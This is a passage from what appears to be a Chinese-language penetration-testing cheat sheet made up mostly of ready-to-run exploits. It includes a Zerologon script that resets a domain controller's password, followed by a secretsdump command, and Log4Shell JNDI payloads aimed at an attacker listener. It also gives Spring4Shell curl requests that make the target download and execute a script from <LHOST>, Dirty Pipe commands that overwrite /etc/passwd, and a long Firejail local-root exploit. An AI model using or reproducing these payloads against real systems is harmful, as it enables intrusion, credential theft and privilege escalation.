class="hljs-number">516</span><br>rpc_con.request(newPassRequest)<br></code></pre></td></tr></table></figure>

<h5 id="武器化概念验证"><a href="#武器化概念验证" class="headerlink" title="武器化概念验证"></a>武器化概念验证</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/env python3<br><br>from impacket.dcerpc.v5 import nrpc, epm<br>from impacket.dcerpc.v5.dtypes import <span class="hljs-literal">NULL</span><br>from impacket.dcerpc.v5 import transport<br>from impacket import crypto<br><br>import hmac, hashlib, <span class="hljs-class"><span class="hljs-keyword">struct</span>, <span class="hljs-title">sys</span>, <span class="hljs-title">socket</span>, <span class="hljs-title">time</span></span><br><span class="hljs-class"><span class="hljs-title">from</span> <span class="hljs-title">binascii</span> <span class="hljs-title">import</span> <span class="hljs-title">hexlify</span>, <span class="hljs-title">unhexlify</span></span><br><span class="hljs-class"><span class="hljs-title">from</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">import</span> <span class="hljs-title">check_call</span></span><br><span class="hljs-class"></span><br><span class="hljs-class"># <span class="hljs-title">Give</span> <span class="hljs-title">up</span> <span class="hljs-title">brute</span>-<span class="hljs-title">forcing</span> <span class="hljs-title">after</span> <span class="hljs-title">this</span> <span class="hljs-title">many</span> <span class="hljs-title">attempts</span>. <span class="hljs-title">If</span> <span class="hljs-title">vulnerable</span>, 256 <span class="hljs-title">attempts</span> <span class="hljs-title">are</span> <span class="hljs-title">expected</span> <span class="hljs-title">to</span> <span class="hljs-title">be</span> <span class="hljs-title">neccessary</span> <span class="hljs-title">on</span> <span class="hljs-title">average</span>.</span><br><span class="hljs-class"><span class="hljs-title">MAX_ATTEMPTS</span> =</span> <span class="hljs-number">2000</span> # False negative chance: <span class="hljs-number">0.04</span>%<br><br>def <span class="hljs-title function_">fail</span><span class="hljs-params">(msg)</span>:<br>  <span class="hljs-title function_">print</span><span class="hljs-params">(msg, file=sys.<span class="hljs-built_in">stderr</span>)</span><br>  <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;This might have been caused by invalid arguments or network issues.&#x27;</span>, file=sys.<span class="hljs-built_in">stderr</span>)</span><br>  sys.<span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span><br><br>def <span class="hljs-title function_">try_zero_authenticate</span><span class="hljs-params">(dc_handle, dc_ip, target_computer)</span>:<br>  # Connect to the DC&#x27;s Netlogon service.<br>  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol=<span class="hljs-string">&#x27;ncacn_ip_tcp&#x27;</span>)<br>  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()<br>  rpc_con.connect()<br>  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)<br><br>  # Use an all-zero challenge and credential.<br>  plaintext = b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span> * <span class="hljs-number">8</span><br>  ciphertext = b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span> * <span class="hljs-number">8</span><br><br>  # Standard flags observed from a Windows <span class="hljs-number">10</span> client (including AES), with only the sign/seal flag disabled. <br>  flags = <span class="hljs-number">0x212fffff</span><br><br>  # Send challenge and authentication request.<br>  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + <span class="hljs-string">&#x27;\x00&#x27;</span>, target_computer + <span class="hljs-string">&#x27;\x00&#x27;</span>, plaintext)<br>  try:<br>    server_auth = nrpc.hNetrServerAuthenticate3(<br>      rpc_con, dc_handle + <span class="hljs-string">&#x27;\x00&#x27;</span>, target_computer + <span class="hljs-string">&#x27;$\x00&#x27;</span>, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,<br>      target_computer + <span class="hljs-string">&#x27;\x00&#x27;</span>, ciphertext, flags<br>    )<br><br>    <br>    # It worked!<br>    assert server_auth[<span class="hljs-string">&#x27;ErrorCode&#x27;</span>] == <span class="hljs-number">0</span><br>    newPassRequest = nrpc.NetrServerPasswordSet2()<br>    newPassRequest[<span class="hljs-string">&#x27;PrimaryName&#x27;</span>] = dc_handle + <span class="hljs-string">&#x27;\x00&#x27;</span><br>    newPassRequest[<span class="hljs-string">&#x27;AccountName&#x27;</span>] = target_computer + <span class="hljs-string">&#x27;$\x00&#x27;</span><br>    newPassRequest[<span class="hljs-string">&#x27;SecureChannelType&#x27;</span>] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel<br>    auth = nrpc.NETLOGON_AUTHENTICATOR()<br>    auth[<span class="hljs-string">&#x27;Credential&#x27;</span>] = b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span> * <span class="hljs-number">8</span><br>    auth[<span class="hljs-string">&#x27;Timestamp&#x27;</span>] = <span class="hljs-number">0</span><br>    newPassRequest[<span class="hljs-string">&#x27;Authenticator&#x27;</span>] = auth<br>    newPassRequest[<span class="hljs-string">&#x27;ComputerName&#x27;</span>] = target_computer + <span class="hljs-string">&#x27;\x00&#x27;</span><br>    newPassRequest[<span class="hljs-string">&#x27;ClearNewPassword&#x27;</span>] =  b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span> * <span class="hljs-number">516</span><br>    rpc_con.request(newPassRequest)<br>    <span class="hljs-keyword">return</span> rpc_con<br><br>  except nrpc.DCERPCSessionError as ex:<br>    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.<br>    <span class="hljs-keyword">if</span> ex.get_error_code() == <span class="hljs-number">0xc0000022</span>:<br>      <span class="hljs-keyword">return</span> None<br>    <span class="hljs-keyword">else</span>:<br>      fail(f<span class="hljs-number">&#x27;U</span>nexpected error code from DC: &#123;ex.get_error_code()&#125;<span class="hljs-number">.&#x27;</span>)<br>  except BaseException as ex:<br>    fail(f<span class="hljs-number">&#x27;U</span>nexpected error: &#123;ex&#125;<span class="hljs-number">.&#x27;</span>)<br><br><br>def perform_attack(dc_handle, dc_ip, target_computer):<br>  # Keep authenticating until succesfull. Expected average number of attempts needed: <span class="hljs-number">256.</span><br>  print(<span class="hljs-string">&#x27;Performing authentication attempts...&#x27;</span>)<br>  rpc_con = None<br>  <span class="hljs-keyword">for</span> attempt in range(<span class="hljs-number">0</span>, MAX_ATTEMPTS):  <br>    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)<br>    <br>    <span class="hljs-keyword">if</span> not rpc_con:<br>      print(<span class="hljs-string">&#x27;=&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;, flush=True)</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">      break</span><br><span class="hljs-string"></span><br><span class="hljs-string">  if rpc_con:</span><br><span class="hljs-string">    print(&#x27;</span>\nSuccess! DC can be fully compromised by a Zerologon attack<span class="hljs-number">.&#x27;</span>)<br>  <span class="hljs-keyword">else</span>:<br>    print(<span class="hljs-string">&#x27;\nAttack failed. Target is probably patched.&#x27;</span>)<br>    sys.<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  <span class="hljs-keyword">if</span> not (<span class="hljs-number">3</span> &lt;= len(sys.argv) &lt;= <span class="hljs-number">4</span>):<br>    print(<span class="hljs-string">&#x27;Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;\n&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;Note: dc-name should be the (NetBIOS) computer name of the domain controller.&#x27;</span>)<br>    sys.<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-keyword">else</span>:<br>    [_, dc_name, dc_ip] = sys.argv<br><br>    dc_name = dc_name.rstrip(<span class="hljs-string">&#x27;$&#x27;</span>)<br>    perform_attack(<span class="hljs-string">&#x27;\\\\&#x27;</span> + dc_name, dc_ip, dc_name)<br></code></pre></td></tr></table></figure>

<h5 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 zerologon_tester.py &lt;HANDLE&gt; &lt;RHOST&gt;<br>impacket-secretsdump -just-dc -no-pass &lt;HANDLE&gt;\$@&lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h4 id="CVE-2021-3156：Sudo-sudoedit-LPE"><a href="#CVE-2021-3156：Sudo-sudoedit-LPE" class="headerlink" title="CVE-2021-3156：Sudo &#x2F; sudoedit LPE"></a>CVE-2021-3156：Sudo &#x2F; sudoedit LPE</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435">https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435</a></p>
</blockquote>
<h5 id="先决条件-2"><a href="#先决条件-2" class="headerlink" title="先决条件"></a>先决条件</h5><ul>
<li>Ubuntu 20.04（sudo 1.8.31）</li>
<li>Debian 10 (sudo 1.8.27)</li>
<li>Fedora 33（sudo 1.9.2）</li>
<li>所有旧版本 &gt;&#x3D; 1.8.2 到 1.8.31p2 以及所有稳定版本 &gt;&#x3D; 1.9.0 到 1.9.5p1</li>
</ul>
<h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudoedit -s /<br></code></pre></td></tr></table></figure>

<p>如果显示以下消息之一，则机器容易受到攻击。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudoedit: /: not a regular file<br>segfault<br></code></pre></td></tr></table></figure>

<p>如果错误消息以 开头，则不容易受到攻击<code>usage:</code>。</p>
<h4 id="CVE-2021-44228：Log4Shell-RCE（0-天）"><a href="#CVE-2021-44228：Log4Shell-RCE（0-天）" class="headerlink" title="CVE-2021-44228：Log4Shell RCE（0 天）"></a>CVE-2021-44228：Log4Shell RCE（0 天）</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wget https:<span class="hljs-comment">//github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">java -jar JNDI-Injection-Exploit<span class="hljs-number">-1.0</span>-SNAPSHOT-all.jar -C <span class="hljs-string">&quot;&lt;COMMAND&gt;&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">$&#123;jndi:ldap:<span class="hljs-comment">//&lt;LHOST&gt;:1389/ci1dfd&#125;</span><br></code></pre></td></tr></table></figure>

<h5 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a></p>
</blockquote>
<h6 id="先决条件-3"><a href="#先决条件-3" class="headerlink" title="先决条件"></a>先决条件</h6><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">tar -xvf jdk<span class="hljs-number">-8u</span>20-linux-x64.tar.gz<br></code></pre></td></tr></table></figure>

<h6 id="启动监听器"><a href="#启动监听器" class="headerlink" title="启动监听器"></a>启动监听器</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python poc.py --userip &lt;LHOST&gt; --webport &lt;RPORT&gt; --lport &lt;LPORT&gt; <br></code></pre></td></tr></table></figure>

<h6 id="执行-1"><a href="#执行-1" class="headerlink" title="执行"></a>执行</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">$&#123;jndi:ldap:<span class="hljs-comment">//&lt;LHOST&gt;:1389/foobar&#125;</span><br></code></pre></td></tr></table></figure>

<h4 id="CVE-2022-0847：脏管道-LPE"><a href="#CVE-2022-0847：脏管道-LPE" class="headerlink" title="CVE-2022-0847：脏管道 LPE"></a>CVE-2022-0847：脏管道 LPE</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -o dirtypipe dirtypipe.c<br>./dirtypipe /etc/passwd <span class="hljs-number">1</span> ootz:<br>su rootz<br></code></pre></td></tr></table></figure>

<h4 id="CVE-2022-22963：Spring4Shell-RCE（0-天）"><a href="#CVE-2022-22963：Spring4Shell-RCE（0-天）" class="headerlink" title="CVE-2022-22963：Spring4Shell RCE（0 天）"></a>CVE-2022-22963：Spring4Shell RCE（0 天）</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/me2nuk/CVE-2022-22963">https://github.com/me2nuk/CVE-2022-22963</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">curl -X POST http:<span class="hljs-comment">//&lt;RHOST&gt;/functionRouter -H &#x27;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;curl &lt;LHOST&gt;/&lt;FILE&gt;.sh -o /dev/shm/&lt;FILE&gt;&quot;)&#x27; --data-raw &#x27;data&#x27; -v</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">curl -X POST http:<span class="hljs-comment">//&lt;RHOST&gt;/functionRouter -H &#x27;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;bash /dev/shm/&lt;FILE&gt;&quot;)&#x27; --data-raw &#x27;data&#x27; -v</span><br></code></pre></td></tr></table></figure>

<h4 id="CVE-2022-31214：Firejail-LPE"><a href="#CVE-2022-31214：Firejail-LPE" class="headerlink" title="CVE-2022-31214：Firejail LPE"></a>CVE-2022-31214：Firejail LPE</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://seclists.org/oss-sec/2022/q2/188">https://seclists.org/oss-sec/2022/q2/188</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2022/06/08/10">https://www.openwall.com/lists/oss-security/2022/06/08/10</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/python3<br><br># Author: Matthias Gerstner &lt;matthias.gerstner () suse com&gt;<br>#<br># Proof of concept local root exploit <span class="hljs-keyword">for</span> a vulnerability in Firejail <span class="hljs-number">0.9</span><span class="hljs-number">.68</span><br><span class="hljs-meta"># in joining Firejail instances.</span><br>#<br># Prerequisites:<br># - the firejail setuid-root binary needs to be installed and accessible to the<br><span class="hljs-meta">#   invoking user</span><br>#<br># Exploit: The exploit tricks the Firejail setuid-root program to join a fake<br># Firejail instance. By using tmpfs mounts and symlinks in the unprivileged<br><span class="hljs-meta"># user namespace of the fake Firejail instance the result will be a shell that</span><br><span class="hljs-meta"># lives in an attacker controller mount namespace while the user namespace is</span><br><span class="hljs-meta"># still the initial user namespace and the nonewprivs setting is unset,</span><br><span class="hljs-meta"># allowing to escalate privileges via su or sudo.</span><br><br>import os<br>import shutil<br>import stat<br>import subprocess<br>import sys<br>import tempfile<br>import time<br>from pathlib import Path<br><br># Print error message and <span class="hljs-built_in">exit</span> with status <span class="hljs-number">1</span><br>def <span class="hljs-title function_">printe</span><span class="hljs-params">(*args, **kwargs)</span>:<br>    kwargs[&#x27;file&#x27;] = sys.<span class="hljs-built_in">stderr</span><br>    <span class="hljs-title function_">print</span><span class="hljs-params">(*args, **kwargs)</span><br>    sys.<span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span><br><br># Return a boolean whether the given file path fulfils the requirements <span class="hljs-keyword">for</span> the<br><span class="hljs-meta"># exploit to succeed:</span><br># - owned by uid 0<br># - size of 1 byte<br># - the content is a single &#x27;1&#x27; ASCII character<br>def <span class="hljs-title function_">checkFile</span><span class="hljs-params">(f)</span>:<br>    s = os.stat(f)<br><br>    <span class="hljs-keyword">if</span> s.st_uid != <span class="hljs-number">0</span> or s.st_size != <span class="hljs-number">1</span> or not stat.S_ISREG(s.st_mode):<br>        <span class="hljs-keyword">return</span> False<br><br>    with open(f) as fd:<br>        ch = fd.read(<span class="hljs-number">2</span>)<br><br>        <span class="hljs-keyword">if</span> len(ch) != <span class="hljs-number">1</span> or ch != <span class="hljs-string">&quot;1&quot;</span>:<br>            <span class="hljs-keyword">return</span> False<br><br>    <span class="hljs-keyword">return</span> True<br><br>def mountTmpFS(loc):<br>    subprocess.check_call(<span class="hljs-string">&quot;mount -t tmpfs none&quot;</span>.split() + [loc])<br><br>def bindMount(src, dst):<br>    subprocess.check_call(<span class="hljs-string">&quot;mount --bind&quot;</span>.split() + [src, dst])<br><br>def checkSelfExecutable():<br>    s = os.stat(__file__)<br><br>    <span class="hljs-keyword">if</span> (s.st_mode &amp; stat.S_IXUSR) == <span class="hljs-number">0</span>:<br>        printe(f<span class="hljs-string">&quot;&#123;__file__&#125; needs to have the execute bit set for the exploit to work. Run `chmod +x &#123;__file__&#125;` and try again.&quot;</span>)<br><br># This creates a <span class="hljs-string">&quot;helper&quot;</span> sandbox that serves the purpose of making available<br><span class="hljs-meta"># a proper <span class="hljs-string">&quot;join&quot;</span> file for symlinking to as part of the exploit later on.</span><br>#<br># Returns a tuple of (proc, join_file), where proc is the running subprocess<br># (it needs to <span class="hljs-keyword">continue</span> running until the exploit happened) and join_file is<br><span class="hljs-meta"># the path to the join file to use for the exploit.</span><br>def createHelperSandbox():<br>    <span class="hljs-meta"># just run a long sleep command in an unsecured sandbox</span><br>    proc = subprocess.Popen(<br>            <span class="hljs-string">&quot;firejail --noprofile -- sleep 10d&quot;</span>.split(),<br>            <span class="hljs-built_in">stderr</span>=subprocess.PIPE)<br><br>    <span class="hljs-meta"># read out the child PID from the stderr output of firejail</span><br>    <span class="hljs-keyword">while</span> True:<br>        line = proc.<span class="hljs-built_in">stderr</span>.readline()<br>        <span class="hljs-keyword">if</span> not line:<br>            raise Exception(<span class="hljs-string">&quot;helper sandbox creation failed&quot;</span>)<br><br>        <span class="hljs-meta"># on stderr a <span class="hljs-keyword">line</span> of the form <span class="hljs-string">&quot;Parent pid &lt;ppid&gt;, child pid &lt;pid&gt;&quot;</span> is output</span><br>        line = line.decode(<span class="hljs-string">&#x27;utf8&#x27;</span>).strip().lower()<br>        <span class="hljs-keyword">if</span> line.find(<span class="hljs-string">&quot;child pid&quot;</span>) == <span class="hljs-number">-1</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        child_pid = line.split()[<span class="hljs-number">-1</span>]<br><br>        try:<br>            child_pid = <span class="hljs-type">int</span>(child_pid)<br>            <span class="hljs-keyword">break</span><br>        except Exception:<br>            raise Exception(<span class="hljs-string">&quot;failed to determine child pid from helper sandbox&quot;</span>)<br><br>    # We need to find the child process of the child PID, this is the<br>    <span class="hljs-meta"># actual sleep process that has an accessible root filesystem in /proc</span><br>    children = f<span class="hljs-string">&quot;/proc/&#123;child_pid&#125;/task/&#123;child_pid&#125;/children&quot;</span><br><br>    # If we are too quick then the child does not exist yet, so sleep a bit<br>    <span class="hljs-keyword">for</span> _ in range(<span class="hljs-number">10</span>):<br>        with open(children) as cfd:<br>            line = cfd.read().strip()<br>            kids = line.split()<br>            <span class="hljs-keyword">if</span> not kids:<br>                time.sleep(<span class="hljs-number">0.5</span>)<br>                <span class="hljs-keyword">continue</span><br>            elif len(kids) != <span class="hljs-number">1</span>:<br>                raise Exception(f<span class="hljs-string">&quot;failed to determine sleep child PID from helper sandbox: &#123;kids&#125;&quot;</span>)<br><br>            try:<br>                sleep_pid = <span class="hljs-type">int</span>(kids[<span class="hljs-number">0</span>])<br>                <span class="hljs-keyword">break</span><br>            except Exception:<br>                raise Exception(<span class="hljs-string">&quot;failed to determine sleep child PID from helper sandbox&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        raise Exception(f<span class="hljs-string">&quot;sleep child process did not come into existence in &#123;children&#125;&quot;</span>)<br><br>    join_file = f<span class="hljs-string">&quot;/proc/&#123;sleep_pid&#125;/root/run/firejail/mnt/join&quot;</span><br>    <span class="hljs-keyword">if</span> not os.path.exists(join_file):<br>        raise Exception(f<span class="hljs-string">&quot;join file from helper sandbox unexpectedly not found at &#123;join_file&#125;&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> proc, join_file<br><br># Re-executes the current script with unshared user and mount namespaces<br>def reexecUnshared(join_file):<br><br>    <span class="hljs-keyword">if</span> not checkFile(join_file):<br>        printe(f<span class="hljs-string">&quot;&#123;join_file&#125;: this file does not match the requirements (owner uid 0, size 1 byte, content &#x27;1&#x27;)&quot;</span>)<br><br>    os.environ[<span class="hljs-string">&quot;FIREJOIN_JOINFILE&quot;</span>] = join_file<br>    os.environ[<span class="hljs-string">&quot;FIREJOIN_UNSHARED&quot;</span>] = <span class="hljs-string">&quot;1&quot;</span><br><br>    unshare = shutil.which(<span class="hljs-string">&quot;unshare&quot;</span>)<br>    <span class="hljs-keyword">if</span> not unshare:<br>        printe(<span class="hljs-string">&quot;could not find &#x27;unshare&#x27; program&quot;</span>)<br><br>    cmdline = <span class="hljs-string">&quot;unshare -U -r -m&quot;</span>.split()<br>    cmdline += [__file__]<br><br>    # Re-execute this script with unshared user and mount namespaces<br>    subprocess.call(cmdline)<br><br><span class="hljs-keyword">if</span> <span 